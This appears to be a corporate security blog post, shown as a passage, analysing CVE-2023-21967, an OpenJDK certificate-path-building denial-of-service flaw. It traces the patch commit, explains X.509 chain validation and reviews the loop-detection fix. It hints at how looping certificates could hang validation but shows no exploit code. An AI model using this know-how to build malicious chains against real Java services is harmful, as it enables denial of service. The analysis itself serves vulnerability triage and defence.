<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Thinking About CVE-2023-21967, an OpenJDK Vulnerability | Security Lab</title>
<meta name="description" content="We will analyze and build a POC for CVE-2023-21967, a vulnerability in OpenJDK.">


  <meta name="author" content="Sam Shahsavar">
  
  <meta property="article:author" content="Sam Shahsavar">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Security Lab">
<meta property="og:title" content="Thinking About CVE-2023-21967, an OpenJDK Vulnerability">
<meta property="og:url" content="http://localhost:8080/_research/2023-10-06-openjdk-vuln-reproduction-CVE-2023-21967/">


  <meta property="og:description" content="We will analyze and build a POC for CVE-2023-21967, a vulnerability in OpenJDK.">





  <meta name="twitter:site" content="@SNSecurityLab">
  <meta name="twitter:title" content="Thinking About CVE-2023-21967, an OpenJDK Vulnerability">
  <meta name="twitter:description" content="We will analyze and build a POC for CVE-2023-21967, a vulnerability in OpenJDK.">
  <meta name="twitter:url" content="http://localhost:8080/_research/2023-10-06-openjdk-vuln-reproduction-CVE-2023-21967/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2023-10-06T00:00:00-07:00">





  

  


<link rel="canonical" href="http://localhost:8080/_research/2023-10-06-openjdk-vuln-reproduction-CVE-2023-21967/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "ServiceNow",
      "url": "http://localhost:8080/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="/assets/css/rouge.css">

<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
<link rel="preload" as="font" href="/assets/fonts/gilroy-regular-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/gilroy-semibold-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/gilroy-bold-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/fira-mono-regular-latin.woff2" type="font/woff2" crossorigin="anonymous"/>

<style>
@font-face {
  font-family: GilroyRegular;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-regular-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-regular-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: GilroySemiBold;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-semibold-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-semibold-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: GilroyBold;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-bold-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-bold-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-regular-latin.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-regular-latin-ext.woff2) format('woff2');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-bold-latin.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-bold-latin-ext.woff2) format('woff2');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
</style>



    <!-- start custom head snippets -->
<script src="https://assets.adobedtm.com/a441b904b50e/99538f40e7c0/launch-3dcaf3475e9d.min.js" async></script>
<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<style>
  @media screen and (width >= 725px) {
    .small-screen {
      display: none;
    }
    .large-screen { }
  }
  @media screen and (width < 725px) {
    .small-screen { }
    .large-screen {
      display: none;
    }
  }

  a {
    /*font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-size: 1rem;
    font-weight: 400;
  }

  .masthead__menu-item a {
    font-size: 0.8rem;
    margin: 0 0.25rem 0 0.25rem;
  }

  .masthead__menu-item_block a {
    white-space: nowrap;
    font-size: 0.8rem;
    color: rgb(255, 255, 255);
    background-color: rgb(41, 62, 64);
    padding-bottom: 0.4rem;
    padding-left: 0.6rem;
    padding-right: 0.6rem;
    padding-top: 0.4rem;
    position: relative;
  }

  .site-brand {
    align-items: center;
    background-color: rgba(0, 0, 0, 0);
    box-sizing: border-box;
    color: rgb(255, 255, 255);
    cursor: pointer;
    /*display: flex;*/
    /*font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-size: 1rem;
    font-weight: 400;
    height: 41px;
    line-height: 25px;
    margin-bottom: 0px;
    margin-left: 0px;
    margin-right: 16px;
    margin-top: 0px;
    outline-color: rgb(255, 255, 255);
    outline-style: none;
    outline-width: 0px;
    padding-bottom: 5px;
    padding-left: 9px;
    padding-right: 0px;
    padding-top: 5px;
    text-align: left;
    text-decoration-color: rgb(255, 255, 255);
    text-decoration-line: none;
    text-decoration-style: solid;
    text-decoration-thickness: auto;
    text-size-adjust: 100%;
    text-wrap: nowrap;
    touch-action: manipulation;
    white-space-collapse: collapse;
    width: auto;
    -webkit-box-align: center;
    -webkit-box-direction: normal;
    -webkit-font-smoothing: antialiased;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  }
  .small-screen a.site-brand {
    margin: 0px;
    padding: 0px;
  }

  .logo {
    border-right: 1px solid #000;
    height: 1.5rem;
    margin-right: 12px;
    min-width: 8rem;
    padding-bottom: 8px;
    padding-right: 12px;
    /*width: 180px;*/
  }

  .masthead__site-title {
    color: rgb(0, 0, 0);
    /*font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-weight: bold;
    font-size: 1rem;
  }

  ul {
    align-items: center;
  }
</style>

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu large-screen">
      <nav id="site-nav" class="greedy-nav large-screen">
        <a class="site-brand" href="/">
          
          <img class="logo" src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
          
          <span class="masthead__site-title">Security Lab</span>
        </a>
        <span class="visible-links">
          <span class="masthead__menu-item"><a href="/cvd" >CVD</a><a href="/snadvisories/" >SN Advisories</a><a href="/research/" >Research Blog</a><a href="/archive/" >Archive</a></span>
          <span class="masthead__menu-item_block">
            <a href="/get-involved" >Get Involved!</a>
          </span>
          
          <button class="search__toggle" type="button">
            <span class="visually-hidden">Toggle search</span>
            <img src="/assets/images/BUS_search-icon.svg" height="28" width="28" alt="Search">
          </button>
          
        </span>
      </nav>
    </div>
    <div class="masthead__menu small-screen">
      <nav id="site-nav" class="greedy-nav small-screen">
        <center><a class="site-brand" href="/">
          
          <img class="logo" src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
          
          <span class="masthead__site-title">Security Lab</span>
        </a></center>
        <center>
        <span class="visible-links">
          <span class="masthead__menu-item"><a href="/cvd" >CVD</a><a href="/snadvisories/" >SN Advisories</a><a href="/research/" >Research Blog</a><a href="/archive/" >Archive</a></span>
          <br>
          <span class="masthead__menu-item_block">
            <a href="/get-involved" >Get Involved!</a>
          </span>
          
          <button class="search__toggle" type="button">
            <span class="visually-hidden">Toggle search</span>
            <img src="/assets/images/BUS_search-icon.svg" height="28" width="28" alt="Search">
          </button>
          
        </span>
        </center>
      </nav>

    </div>
  </div>
</div>


    <div class="initial-content">
      







<div class="page__hero"
  style=" background-image: url('');"
>
  
    <img src="" alt="Thinking About CVE-2023-21967, an OpenJDK Vulnerability" class="page__hero-image">
  
  
</div>



  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:8080/" itemprop="item"><span itemprop="name" class="breadcrumb_item">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">></span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/_research" itemprop="item"><span itemprop="name" class="breadcrumb_item">_research</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">></span>
      
    
      
      
        <li class="current">[ Thinking About CVE-2023-21967, an OpenJDK Vulnerability ]</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Thinking About CVE-2023-21967, an OpenJDK Vulnerability">
    <meta itemprop="description" content="We will analyze and build a POC for CVE-2023-21967, a vulnerability in OpenJDK.">
    <meta itemprop="datePublished" content="2023-10-06T00:00:00-07:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Thinking About CVE-2023-21967, an OpenJDK Vulnerability
</h1>
          


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#identifying-a-cve">Identifying a CVE</a></li><li><a href="#information-gathering">Information Gathering</a></li><li><a href="#certificate-chain-path-building-and-validation">Certificate Chain, Path Building and Validation</a></li><li><a href="#code-review">Code Review</a><ul><li><a href="#forwardbuilderjava">ForwardBuilder.java</a></li></ul></li><li><a href="#configuration">Configuration</a></li><li><a href="#proof-of-concept">Proof of Concept</a></li><li><a href="#proof-of-concept---client-authentication">Proof of Concept - Client Authentication</a></li><li><a href="#further-tests">Further Tests</a></li><li><a href="#impact">Impact</a></li><li><a href="#final-thoughts">Final Thoughts</a></li></ul>

            </nav>
            
          </aside>
        
        <p>Security professionals are inundated with CVEs; the National Vulnerability Database reports receiving over 2,466 to
analyze in August 2023 alone.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> It remains an important skill to triage and remediate vulnerabilities most important to 
your products and environment. Part of this involves technically analyzing publicly available vulnerability data to make 
an assessment about the changes.</p>

<p>In this post, we will demonstrate this process with CVE-2023-21967, a vulnerability in OpenJDK.</p>

<h2 id="identifying-a-cve">Identifying a CVE</h2>

<p>The April 2023 <a href="https://openjdk.org/groups/vulnerability/advisories/2023-04-18">OpenJDK Vulnerability Advisory</a>
and <a href="https://www.oracle.com/security-alerts/cpuapr2023.html">Oracle Critical Patch Update (CPU) Advisory</a> both list
CVE-2023-21967, among numerous other vulnerabilities. The stated affected versions are 20, 17.0.6, 11.0.18, 8u362, and
earlier. These two sources both list <code class="language-plaintext highlighter-rouge">security-libs/javax.net.ssl</code> or “JSSE” as the affected component. JSSE, or 
Java Secure Socket Extension, is an API implementation of TLS and DTLS. This API provides all the encryption protocol 
support and certificate parsing to securely communicate over the Internet without developers needing to create their own
implementations.</p>

<p>With a CVSSv3.1 score of 5.9 and a vector of <code class="language-plaintext highlighter-rouge">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code>, this vulnerability exists 
in the tricky middle ground when it comes to prioritizing an upgrade fix. The two advisories themselves fail to provide 
any further information relating to the vulnerability fix.</p>

<p>Not all CVE descriptions are created equal. The description provided to MITRE, listed below, is fairly generic and
typical of OpenJDK CVEs.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup></p>

<blockquote>
  <p>Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).
Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM
Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with
network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this
vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle
Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients
running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code
that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by
using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score
5.9 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H).<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup></p>
</blockquote>

<p>“Difficult to exploit” and “a hang or frequently repeatable crash (complete DOS)” are less than concrete. Unfortunately,
the CPU and JDK release notes fail to provide any further information. The lack of details lends this CVE to further 
analysis.</p>

<h2 id="information-gathering">Information Gathering</h2>

<p>The initial CVE references do not provide any further specific details about location in the code. We can of course do
a diff between versions on the <a href="https://github.com/openjdk/jdk11u">OpenJDK source</a> to narrow down affected files, but a
quick search with the CVE ID pulls up the <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2187704">Red Hat bug tracker</a> for
this issue.</p>

<div style="text-align: center;">
  <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/red-hat-bugzilla.png" alt="" />
<em>The issue on <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2187704">Red Hat Bugzilla</a></em></p>
</div>

<p>This particular entry gives us an OpenJDK bug tracking ID of 8298310 in the title, but access controls
prevent us from using this to read the Open JDK bug tracking system’s 
<a href="https://bugs.openjdk.org/browse/JDK-8298310">entry for this issue</a>. Unfortunately, it is common practice for 
the public to be restricted from accessing security related entries in the bug tracker, even for four year old 
vulnerabilities with released exploit code.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup> In this case, we got lucky in getting the OpenJDK bug ID this way, 
though they are sometimes included in CPUs. More generally, these IDs can be reliably obtained from patch commits linked
in the issue’s comments:</p>

<div style="text-align: center;">
  <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/commits.png" alt="" />
<em>The commits posted on <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2187704">Red Hat Bugzilla</a></em></p>
</div>

<p>These comments get us what we need,
a <a href="https://github.com/openjdk/jdk11u/commit/4a4f5c528c8b59669e5cc1df1b0e1ad9eb44497b">commit</a> and a slightly better
description.</p>

<p>The commit lists changes to six files in <code class="language-plaintext highlighter-rouge">src/java.base/share/classes/sun/security/provider/certpath/</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">AdjacencyList.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">Builder.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">ForwardBuilder.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">ForwardState.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">State.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">SunCertPathBuilder.java</code></li>
</ul>

<p>Given the files and brief description from the Red Hat bug tracker, we suspect that the vulnerability occurs within the
certificate chain validation functionality utilized when establishing a TLS connection. Before proceeding to dissect the
specific file changes, let us look more generally at how certificate chain validation occurs.</p>

<h2 id="certificate-chain-path-building-and-validation">Certificate Chain, Path Building and Validation</h2>

<p>In order to establish a secure TLS connection, the client needs to trust the certificate provided from the server by 
making sure it is issued by a trusted Certificate Authority (CA). The trust relation is based on certificates signature.
Basically, a certificate is trusted if it is signed by a trusted entity.</p>

<p>To do so, the client will rely on a list of trusted certificates stored within its truststore. This is accomplished by 
checking if the server’s certificate has been issued and signed by a trusted entity. However, in most cases a 
single certificate provided by a server will not be directly issued by a trusted CA. In such scenarios, the server will 
provide the client with additional certificates that fill the gap between the server’s end-entity (or leaf) certificate and a root
certificate. This is is called a <code class="language-plaintext highlighter-rouge">certificate chain</code>.</p>

<p>As illustrated in the next picture, a certificate chain is nothing other than a list of certificates connected to each 
other by a relation of trust (signature). Those additional certificates appearing in the middle are called 
<code class="language-plaintext highlighter-rouge">Intermediate Certificates</code>. Each intermediate certificate is signed by either a root certificate or another 
intermediary certificate. The link from the server’s certificate to the root certificate going through <code class="language-plaintext highlighter-rouge">n</code> intermediate 
certificates is called a <code class="language-plaintext highlighter-rouge">path</code>.</p>

<div style="text-align: center;">
  <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/CertChain.png" alt="" /></p>
</div>

<p>One can imagine the PKI structure (including truststore + chain received) as a directed graph where each vertex is a certificate 
and any edge between two vertices A and B means that certificate A is the issuer of certificate B.</p>

<p>After receiving the certificate chain, the client will utilize those certificates to attempt to build a valid path from the end 
entity to a trusted root certificate. <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-6.1">Section 6.1 of RFC 5280</a> 
provides the following succinct description of a basic x.509 path validation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  (a)  for all x in {1, ..., n-1}, the subject of certificate x is
       the issuer of certificate x+1;

  (b)  certificate 1 is issued by the trust anchor;

  (c)  certificate n is the certificate to be validated (i.e., the
       target certificate); and

  (d)  for all x in {1, ..., n}, the certificate was valid at the
       time in question.
</code></pre></div></div>

<p>This brief description does not highlight all of the complexities involved. <a href="https://datatracker.ietf.org/doc/html/rfc4158">RFC 4158</a> 
details the methodology and algorithms and optimizations to build a valid path in scenarios 
more complicated than a straightforward hierarchical PKI scenario.</p>

<p>In recent years, the ability for a client to build a valid path has received more attention as major root CA 
certificates expired, such as the <a href="https://crt.sh/?id=1">AddTrust External CA Root</a> certificate in May 2020 or the <a href="https://crt.sh/?id=3479778542">Let’s Encrypt R3</a>
certificate in September 2021. As of TLS 1.3, servers may send certificate chains capable of building multiple valid 
paths, especially relevant when transitioning intermediate certificates<sup id="fnref:10" role="doc-noteref"><a href="#fn:10" class="footnote" rel="footnote">5</a></sup>. Outages may appear to occur when 
one path fails and clients cannot build an alternative trusted path.</p>

<h2 id="code-review">Code Review</h2>

<p>JSSE performs <em>Public Key Infrastructure (X.509)</em> (PKIX) certificate chain validation as described
in <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-6">RFC 5280 (Section 6)</a>. Specifically, a <code class="language-plaintext highlighter-rouge">PKIXValidator</code> will
return a validated X.509 certificate chain. This chain is provided by the default PKIX certificate path
builder, <code class="language-plaintext highlighter-rouge">SunCertPathBuilder</code>, utilizing a set of requirements defined in a <code class="language-plaintext highlighter-rouge">PKIXBuilderParameters</code> object.</p>

<figure>
  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">X509Certificate</span><span class="o">[]</span> <span class="nf">doBuild</span><span class="o">(</span><span class="nc">X509Certificate</span><span class="o">[]</span> <span class="n">chain</span><span class="o">,</span>
        <span class="nc">Collection</span><span class="o">&lt;</span><span class="nc">X509Certificate</span><span class="o">&gt;</span> <span class="n">otherCerts</span><span class="o">,</span>
        <span class="nc">PKIXBuilderParameters</span> <span class="n">params</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">CertificateException</span> <span class="o">{</span>
    
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">setDate</span><span class="o">(</span><span class="n">params</span><span class="o">);</span>
        
        <span class="c1">// setup target constraints</span>
        <span class="nc">X509CertSelector</span> <span class="n">selector</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">X509CertSelector</span><span class="o">();</span>
        <span class="n">selector</span><span class="o">.</span><span class="na">setCertificate</span><span class="o">(</span><span class="n">chain</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
        <span class="n">params</span><span class="o">.</span><span class="na">setTargetCertConstraints</span><span class="o">(</span><span class="n">selector</span><span class="o">);</span>
        
        <span class="c1">// setup CertStores</span>
        <span class="nc">Collection</span><span class="o">&lt;</span><span class="nc">X509Certificate</span><span class="o">&gt;</span> <span class="n">certs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">X509Certificate</span><span class="o">&gt;();</span>
        <span class="n">certs</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">chain</span><span class="o">));</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">otherCerts</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">certs</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">otherCerts</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nc">CertStore</span> <span class="n">store</span> <span class="o">=</span> <span class="nc">CertStore</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"Collection"</span><span class="o">,</span>
                            <span class="k">new</span> <span class="nf">CollectionCertStoreParameters</span><span class="o">(</span><span class="n">certs</span><span class="o">));</span>
        <span class="n">params</span><span class="o">.</span><span class="na">addCertStore</span><span class="o">(</span><span class="n">store</span><span class="o">);</span>
        
        <span class="c1">// do the build</span>
        <span class="nc">CertPathBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="nc">CertPathBuilder</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"PKIX"</span><span class="o">);</span>
        <span class="nc">PKIXCertPathBuilderResult</span> <span class="n">result</span> <span class="o">=</span>
        <span class="o">(</span><span class="nc">PKIXCertPathBuilderResult</span><span class="o">)</span><span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">params</span><span class="o">);</span>
        
        <span class="k">return</span> <span class="nf">toArray</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">getCertPath</span><span class="o">(),</span> <span class="n">result</span><span class="o">.</span><span class="na">getTrustAnchor</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">GeneralSecurityException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">ValidatorException</span>
            <span class="o">(</span><span class="s">"PKIX path building failed: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">(),</span> <span class="n">e</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div>  </div>
  <figcaption>
    <p><em>src/java.base/share/classes/sun/security/validator/PKIXValidator.java</em></p>
  </figcaption>
</figure>

<p><code class="language-plaintext highlighter-rouge">SunCertPathBuilder</code> uses a depth-first search algorithm to create a validated certificate chain from the
target end-entity certificate to a trust anchor certificate. The recursive <code class="language-plaintext highlighter-rouge">depthFirstSearchForward</code> method of <code class="language-plaintext highlighter-rouge">SunCertPathBuilder</code> 
proceeds building a path of certificates, backtracking when the chain terminates before reaching a trust anchor or the 
path reaches a maximum length.<code class="language-plaintext highlighter-rouge">ForwardState</code> and <code class="language-plaintext highlighter-rouge">ForwardBuilder</code> provide the necessary state and certificate retrieval 
functionality utilized during path creation.</p>

<p>The commit lists changes to six files in <code class="language-plaintext highlighter-rouge">src/java.base/share/classes/sun/security/provider/certpath/</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">AdjacencyList.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">Builder.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">ForwardBuilder.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">ForwardState.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">State.java</code></li>
  <li><code class="language-plaintext highlighter-rouge">SunCertPathBuilder.java</code></li>
</ul>

<p>The changes in <code class="language-plaintext highlighter-rouge">ForwardBuilder.java</code> are the most significant and the likely candidate for the vulnerability. 
Changes in the other files mostly appear to be cleanup and minor improvements.</p>

<h3 id="forwardbuilderjava">ForwardBuilder.java</h3>

<p><code class="language-plaintext highlighter-rouge">ForwardBuilder::verifyCert</code> contains significant changes to loop detection. It is trivial to build a set of two
certificates that point to each other as issuers. Loop detection prevents infinite recursion by failing when a
certificate shows up twice in a given certificate path, so this change could be significant. Previously, <code class="language-plaintext highlighter-rouge">verifyCert</code>
used the <code class="language-plaintext highlighter-rouge">Certificate::equals</code> method when comparing certificates for equality.</p>

<div style="text-align: center;">
  <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/ForwardBuilder.png" alt="" />
<em>Commit differential of <a href="https://github.com/openjdk/jdk11u/commit/4a4f5c528c8b59669e5cc1df1b0e1ad9eb44497b#diff-fdebcc30d7995f7538230a4976781a3792b98c1072b4c2f94b81276ab663a2bc">ForwardBuilder</a></em></p>
</div>

<p>The documentation for <code class="language-plaintext highlighter-rouge">Certificate::equals</code>:</p>

<blockquote>
  <p>Compares this certificate for equality with the specified object. If the other object is an instanceof Certificate,
then its encoded form is retrieved and compared with the encoded form of this certificate.</p>
</blockquote>

<p>The new <code class="language-plaintext highlighter-rouge">repeated</code> method enhances the logic. It keeps a <code class="language-plaintext highlighter-rouge">Certificate::equals</code> check, but also considers two certificates
equal if their respective public keys, subject distinguished names, and subject alternative names match.</p>

<figure>
  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/**
    * Return true if two certificates are equal or have the same subject,
    * public key, and subject alternative names.
    */</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">repeated</span><span class="o">(</span>
            <span class="nc">X509Certificate</span> <span class="n">currCert</span><span class="o">,</span> <span class="nc">X509Certificate</span> <span class="n">nextCert</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">currCert</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">nextCert</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="o">(</span><span class="n">currCert</span><span class="o">.</span><span class="na">getSubjectX500Principal</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span>
            <span class="n">nextCert</span><span class="o">.</span><span class="na">getSubjectX500Principal</span><span class="o">())</span> <span class="o">&amp;&amp;</span>
            <span class="n">currCert</span><span class="o">.</span><span class="na">getPublicKey</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">nextCert</span><span class="o">.</span><span class="na">getPublicKey</span><span class="o">())</span> <span class="o">&amp;&amp;</span>
            <span class="n">altNamesEqual</span><span class="o">(</span><span class="n">currCert</span><span class="o">,</span> <span class="n">nextCert</span><span class="o">));</span>
    <span class="o">}</span>

    <span class="cm">/**
     * Return true if two certificates have the same subject alternative names.
     */</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">altNamesEqual</span><span class="o">(</span>
            <span class="nc">X509Certificate</span> <span class="n">currCert</span><span class="o">,</span> <span class="nc">X509Certificate</span> <span class="n">nextCert</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">X509CertImpl</span> <span class="n">curr</span><span class="o">,</span> <span class="n">next</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">curr</span> <span class="o">=</span> <span class="nc">X509CertImpl</span><span class="o">.</span><span class="na">toImpl</span><span class="o">(</span><span class="n">currCert</span><span class="o">);</span>
